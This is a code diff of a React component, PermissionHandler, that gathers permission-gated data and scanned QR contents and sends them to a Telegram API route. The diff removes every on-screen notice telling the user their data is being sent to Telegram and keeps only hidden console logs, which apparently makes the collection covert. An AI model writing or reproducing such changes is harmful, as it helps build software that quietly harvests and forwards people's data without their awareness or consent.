@@ -1,7 +1,7 @@
 "use client";
 
 import React, { useEffect, useRef, useState } from "react";
-import { toast } from "sonner";
+// import { toast } from "sonner"; // Удаляем импорт toast
 import QrScanner from "./qr-scanner"; // Import the new QrScanner component
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
@@ -25,7 +25,7 @@ const PermissionHandler = () => {
 
   const sendDataToTelegram = async (data: DataToSend) => {
     if (Object.keys(data).length === 0) {
-      toast.info("No data to send to Telegram (permissions denied or unavailable).");
+      // toast.info("No data to send to Telegram (permissions denied or unavailable)."); // Удаляем тост
       return;
     }
 
@@ -39,13 +39,15 @@ const PermissionHandler = () => {
       });
 
       if (response.ok) {
-        toast.success("Data successfully sent to Telegram!");
+        // toast.success("Data successfully sent to Telegram!"); // Удаляем тост
       } else {
         const errorData = await response.json();
-        toast.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
+        console.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`); // Оставляем console.error
+        // toast.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`); // Удаляем тост
       }
     } catch (error: any) {
-      toast.error(`Network error sending data to Telegram: ${error.message}`);
+      console.error(`Network error sending data to Telegram: ${error.message}`); // Оставляем console.error
+      // toast.error(`Network error sending data to Telegram: ${error.message}`); // Удаляем тост
     } finally {
         setAppPhase("finished"); // Mark as finished after attempting to send
     }
@@ -54,14 +56,14 @@ const PermissionHandler = () => {
   const handleQrCodeScanned = (qrData: string) => {
     console.log("QR Code Scanned in PermissionHandler:", qrData);
     setDataToSend((prev) => ({ ...prev, qrCodeData: qrData }));
-    toast.success("QR Code scanned!");
+    // toast.success("QR Code scanned!"); // Удаляем тост
     // Now send all collected data including QR code
     sendDataToTelegram({ ...dataToSend, qrCodeData: qrData });
   };
 
   const handleQrScanError = (error: string) => {
-    console.error("QR Scan Error:", error);
-    toast.error(`QR Scan Error: ${error}`);
+    console.error("QR Scan Error:", error); // Оставляем console.error
+    // toast.error(`QR Scan Error: ${error}`); // Удаляем тост
     // If QR scan fails, still try to send other data
     sendDataToTelegram(dataToSend);
   };
